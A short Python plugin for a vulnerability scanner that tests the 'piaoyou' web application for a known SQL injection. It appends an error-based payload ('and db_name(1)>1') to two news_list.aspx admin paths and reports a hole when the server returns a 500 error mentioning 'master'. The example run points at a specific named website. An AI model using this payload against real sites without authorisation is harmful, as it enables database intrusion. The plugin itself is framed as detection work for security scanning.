#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0130548

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
        
        
def audit(arg): 
    payload1 = [
    'manage/news_list.aspx?s=1',
    'manage/news_list.aspx?id=1'
    ]
    for payload in payload1:
        url = arg + payload + '%20and%20db_name%281%29%3E1'
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 500 and 'master' in res :
            security_hole(arg + payload + '  :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou','http://www.iyoungsh.com/')[1])